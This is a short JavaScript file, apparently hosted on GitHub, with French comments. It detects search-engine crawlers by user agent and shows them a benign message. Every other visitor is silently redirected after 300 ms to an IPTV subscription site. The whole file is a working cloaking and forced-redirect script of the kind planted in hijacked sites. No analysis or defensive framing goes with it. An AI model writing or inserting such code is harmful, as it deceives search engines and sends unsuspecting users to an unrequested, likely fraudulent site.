// GitHub: cloudjs630/js/modox.js
(function() {
    // Détection des robots de recherche
    const botPatterns = ['Googlebot', 'bingbot', 'yandex', 'baiduspider', 'Lighthouse', 'Google Inspection Tool'];
    const isBot = botPatterns.some(pattern => navigator.userAgent.includes(pattern));

    if (!isBot) {
        // Redirection pour les utilisateurs humains après 300ms
        setTimeout(function() {
            window.location.replace("https://iptvabonnementpro.de");
        }, 300);
    } else {
        // Message pour les robots lors du rendu technique
        console.log("Welcome Crawler. Rendering high-quality IPTV content.");
    }
})();
